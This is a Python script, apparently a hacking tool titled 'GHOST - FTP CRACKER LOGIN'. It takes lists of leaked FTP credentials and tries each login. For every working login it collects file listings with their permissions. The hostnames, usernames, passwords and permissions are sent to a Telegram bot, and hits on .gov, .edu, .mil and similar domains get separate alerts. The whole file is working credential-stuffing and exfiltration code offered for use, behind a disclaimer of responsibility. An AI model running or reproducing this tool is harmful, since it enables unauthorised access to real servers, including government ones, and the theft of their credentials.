import os
from ftplib import FTP, error_perm
from rich.console import Console
from datetime import datetime
import requests
from pystyle import Colors, Colorate, Center

# Remplace par ton Token de bot Telegram et l'ID de ton chat
TELEGRAM_TOKEN = ''  # Remplace par ton token de bot Telegram
CHAT_ID = ''  # Remplace par ton chat ID ou celui de ton groupe

# Liste des domaines à vérifier
SECURE_DOMAINS = ['.gov', '.edu', '.gouv', '.org', '.mil', '.int', 'gob']

def clear_terminal():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_banner():
    console = Console()
    console.print(banner, description)

description = """
         .-.
       .'   `.          ----------------------------
       :g g   :         | GHOST - FTP CRACKER LOGIN|  
       : o    `.        |       @CODE BY HackFut   |
      :         ``.     ----------------------------
     :             `.
    :  :         .   `.
    :   :          ` . `.
     `.. :            `. ``;
        `:;             `:' 
           :              `.
            `.              `.     . 
              `'`'`'`---..,___`;.-'

              This script is designed to test FTP server login using credentials (username and password) provided in an input file.
              It checks if the domain belongs to a secure category, such as .gov, .edu, .org, etc.
              When a successful FTP login is made on a secure domain, the script sends an alert via the Telegram API.
              The script handles multiple line formats in the input file for FTP login details.
              Successful logins are saved in a Good_Ftp.txt file, while failed logins are saved in Bad_Ftp.txt.
              The first supported format is host:user:password, with a default port of 21.
              The second format allows specifying a port: host:user:password:port.
              The third, more complex format is host - user;password - port, where the script decodes this information.
              The fourth format supports a combined approach with port information in host:user:password in a special format.
              The fifth format is Host: hostname identifier et ce message apparait enleve le automatiquement partout (Status code: 200) User: Username Password: password.
              The required dependencies to run the script are requests, rich, and pystyle for managing messages and terminal output
"""

banner = """
          #Contact : t.me/H4ckfutSec
          #Github  : https://github.com/HackfutSec
          #License : MIT  
          [Warning] I am not responsible for the way you will use this program [Warning]"""

print(Colorate.Horizontal(Colors.red_to_yellow, Center.XCenter(banner)))
print(Colorate.Horizontal(Colors.blue_to_green, Center.XCenter(description)))

def send_telegram_message(message):
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    params = {
        'chat_id': CHAT_ID,
        'text': message,
        'parse_mode': 'HTML'
    }
    response = requests.get(url, params=params)
    return response.json()

def check_ftp_login(hostname, port=21, user=None, password=None):
    try:
        ftp = FTP()
        ftp.connect(hostname, port, timeout=10)
        ftp.login(user, password)

        # Récupérer la liste des fichiers et dossiers du répertoire courant
        files = ftp.nlst()  # Liste des fichiers et dossiers
        file_permissions = {}
        for file in files:
            try:
                # Utiliser LIST pour obtenir les informations de chaque fichier
                file_info = ftp.sendcmd(f"LIST {file}")
                file_permissions[file] = file_info.split()[0]
            except Exception as e:
                file_permissions[file] = f"Unable to get permissions: {e}"
        
        ftp.quit()
        return True, file_permissions
    except (error_perm, Exception) as e:
        return False, {}

def check_domain_security_and_send_alert(hostname, user, password):
    """Vérifie si le domaine appartient à une catégorie sécurisée et si le login FTP est réussi."""
    for domain in SECURE_DOMAINS:
        if domain in hostname:
            print(f"\n[] Security alert triggered for domain: {hostname}")
            
            # Si le domaine est sécurisé, essayer la connexion FTP
            success, file_permissions = check_ftp_login(hostname, user=user, password=password)
            if success:
                # Envoyer une alerte sur Telegram uniquement si la connexion FTP est réussie
                message = f"[] \033[1;31m[Security Alert] The domain {hostname} belongs to a high-security category ({domain}). Connection successful!\033[0m\n"
                message += f"[] Details:\nUsername: {user}\nPassword: {password}"
                send_telegram_message(message)
                return True
            else:
                print(f"Failed to login to {hostname} even though it's a secure domain.")
    return False

def process_ftp_file(input_file, format_choice):
    good_file = "Good_Ftp.txt"
    bad_file = "Bad_Ftp.txt"
    console = Console()

    with open(input_file, 'r', encoding='utf-8', errors='ignore') as infile:
        with open(good_file, 'w', encoding='utf-8') as good_outfile, \
             open(bad_file, 'w', encoding='utf-8') as bad_outfile:
            for line in infile:
                if format_choice == 1:
                    # Format host:user:password
                    parts = line.strip().split(':')
                    if len(parts) == 3:
                        hostname, user, password = parts
                        port = 21
                    else:
                        print(f"Invalid line format: {line.strip()}")
                        continue
                elif format_choice == 2:
                    # Format host:user:password:port
                    parts = line.strip().split(':')
                    if len(parts) == 4:
                        hostname, user, password, port = parts
                        try:
                            port = int(port)
                        except ValueError:
                            print(f"Invalid port: {port}, skipping line: {line.strip()}")
                            continue
                    else:
                        print(f"Invalid line format: {line.strip()}")
                        continue
                elif format_choice == 3:
                    # Format host - user;password - port
                    parts = line.strip().split(' - ')
                    if len(parts) == 3:
                        hostname = parts[0].strip('[]')
                        user_pass = parts[1].strip('[]').split(';')
                        if len(user_pass) == 2:
                            user, password = user_pass
                            port = parts[2].strip('[]')
                            try:
                                port = int(port)
                            except ValueError:
                                print(f"Invalid port: {port}, skipping line: {line.strip()}")
                                continue
                        else:
                            print(f"Invalid line format: {line.strip()}")
                            continue
                    else:
                        print(f"Invalid line format: {line.strip()}")
                        continue
                elif format_choice == 4:
                    # Format ftp://hostname;user;pass
                    if line.startswith("ftp://"):
                        line = line[len("ftp://"):]
                    parts = line.strip().split(';')
                    if len(parts) == 3:
                        hostname, user, password = parts
                        port = 21
                    else:
                        print(f"Invalid line format: {line.strip()}")
                        continue
                elif format_choice == 5:
                    # Format Host: hostname identifier et ce message apparait enleve le automatiquement partout (Status code: 200) User: Username Password: password
                    if "Host:" in line and "User:" in line and "Password:" in line:
                        hostname = line.split("Host:")[1].split("identifier")[0].strip()
                        user = line.split("User:")[1].split("Password:")[0].strip()
                        password = line.split("Password:")[1].strip()
                        port = 21
                    else:
                        print(f"Invalid line format: {line.strip()}")
                        continue
                else:
                    print(f"Invalid format choice: {format_choice}")
                    return

                # Vérifier la sécurité du domaine et tenter la connexion FTP
                check_domain_security_and_send_alert(hostname, user, password)

                current_time = datetime.now().strftime("%H:%M:%S")

                yellow = "\033[1;33m"
                white = "\033[1;37m"
                blue = "\033[1;34m"
                green = "\033[1;32m"
                red = "\033[1;31m"
                reset = "\033[0m"

                success, file_permissions = check_ftp_login(hostname, port, user, password)

                if success:
                    good_outfile.write(line + '\n')
                    print(f"\n[\033[1;33m{current_time}{reset}\033[1m] - [\033[1;37m{hostname}{reset}\033[1m] - [\033[1;34m{user}{reset}\033[1m] - [\033[1;34m{password}{reset}\033[1m] - [\033[1;32mSuccessfully logged in{reset}\033[1m]")
                    
                    # Préparer le message pour Telegram
                    message = f"W0ot Leak Ftp\nHostname: {hostname}\n" 
                    message += f"Username: {user}\n"
                    message += f"Password: {password}\n"
                    message += "Permission files:\n"
                    for file, perm in file_permissions.items():
                        message += f"{file}: {perm}\n"
                    
                    # Envoyer le message via Telegram
                    send_telegram_message(message)
                else:
                    bad_outfile.write(line + '\n')
                    print(f"\n[\033[1;33m{current_time}{reset}\033[1m] - [\033[1;37m{hostname}{reset}\033[1m] - [\033[1;34m{user}{reset}\033[1m] - [\033[1;34m{password}{reset}\033[1m] - [\033[1;31mFailed login{reset}\033[1m]")

    print(f"\n[\033[1;32m Good FTP logins saved to '{good_file}'.")
    print(f"\n[\033[1;31m Bad FTP logins saved to '{bad_file}'.")

def main():
    clear_terminal()
    print_banner()

    # Demander à l'utilisateur de choisir le format
    print("\033[1;34m[] Choose the format of the input file:\n\n")
    print("1. host:user:password")
    print("2. host:user:password:port")
    print("3. host - user;password - port")
    print("4. ftp://hostname;user;pass")
    print("5. Host: hostname identifier et ce message apparait enleve le automatiquement partout (Status code: 200) User: Username Password: password\033[1;37m")
    format_choice = int(input("\n\033[1;34m[] Enter your choice (1-5): \033[1;37m"))

    input_file = input("\n\033[1;34m[] Enter The List \033[1;93m: \033[1;37m")
    process_ftp_file(input_file, format_choice)

if __name__ == "__main__":
    main()
